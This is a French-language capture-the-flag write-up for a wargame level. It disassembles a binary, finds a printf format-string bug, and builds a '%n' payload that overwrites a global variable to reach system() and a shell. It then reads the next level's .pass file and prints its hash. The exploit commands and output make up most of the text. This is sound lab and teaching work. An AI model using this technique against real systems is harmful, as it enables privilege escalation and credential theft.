@@ -1,0 +1,71 @@
+objdump sur level3 nous montre une fonction main qui appelle une fonction v
+
+on disass la fonction v
+(gdb) disass v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x218,%esp
+   0x080484ad <+9>:	mov    0x8049860,%eax
+   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484be <+26>:	lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:	mov    %eax,(%esp)
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:	mov    %eax,(%esp)
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+   0x080484e4 <+64>:	mov    0x8049880,%eax
+   0x080484e9 <+69>:	mov    %eax,%edx
+   0x080484eb <+71>:	mov    $0x8048600,%eax
+   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:	mov    %eax,(%esp)
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	movl   $0x804860d,(%esp)
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+   0x08048518 <+116>:	leave
+   0x08048519 <+117>:	ret
+
+Call fgets, printf, fwrite, system
+
+https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
+
+On lance le level3
+$> level3
+%x
+200
+$> level3
+[...]
+$> level3
+AAAA%x%x%x%x
+AAAA200b7fd1ac0b7ff37d041414141
+A partir du 3eme arg le debut de la chaine est ecrit
+
+Il existe une option sur printf "%n" qui permet d'ecrire directement dans une adresse.
+Oui mais on ecrit quoi ?
+
+On retient dans notre petite tete que si l'on fait '%4$n' cela revient a faire %x%x%x%n (les trois %x sont sautes car on prend que le 4eme argument)
+
+Si on reprend le code déssasemblé alors on remarque qu'après le printf:
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+
+Il compare 0x40 (donc 64) avec le contenu de 0x804988c ...
+0x804988c => \x8c\x98\x04\x08 
+Si on arrive a rentrer dans le cmp alors plus tard dans le code il y a un appel system qui lance un shell.
+Donc on fait notre petite injection:
+
+$> python -c "print '\x8c\x98\x04\x08' + '%60c' + '%4\$n'" > /tmp/test1
+
+On ecrit l'adresse de la variable => 4 octets
+Puis on fait une largeur de 60c (c etant vide cela va juste faire 60 espace) => 60 octets
+%n va alors calculer la taille de toute la chaine donc 64 octets et l'ecrire a l'adresse 0x804988c
+
+$> cat /tmp/test1 - | ./level3
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
